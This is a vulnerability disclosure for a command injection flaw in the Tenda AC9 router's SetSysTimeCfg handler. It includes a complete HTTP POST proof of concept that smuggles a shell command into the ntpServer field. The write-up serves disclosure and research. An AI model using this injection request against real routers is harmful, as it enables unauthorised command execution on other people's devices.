# Tenda AC9 V15.03.2.21_cn has a command injection vulnerability

## Overview

- **Type**: command injection vulnerability
- **Vendor**: Tenda ([https://tenda.com.cn](https://tenda.com.cn/))
- **Products**: WiFi Router AC9
- **Firmware download address:** https://www.tenda.com.cn/download/default.html

## Affected version

![image-20220214114428086](images/image-20220214114428086.png)

Figure 1 shows the latest firmware Ba of the router

## Vulnerability details

![Pasted image 20220526161155](images/Pasted%20image%2020220526161155.png)

![Pasted image 20220526161917](images/Pasted%20image%2020220526161917.png)

The parameter Ntpserver is passed to tip_sntp_handle->doSystemCmd. A command injection vulnerability was formed.

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Use the fat simulation firmware V15.03.2.21_cn
2. Attack with the following POC attacks

```txt
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.0.1
Content-Length: 76
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/system_time.html?random=0.9150451753353981&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=25f9e794323b453885f5181f1b624d0btjotgb
Connection: close

timePeriod=86400&ntpServer="time.windows.com| ls > /tmp/f0und"&timeZone=20%3A00
```

![Pasted image 20220526155859](images/Pasted%20image%2020220526155859.png)

![Pasted image 20220526160414](images/Pasted%20image%2020220526160414.png)

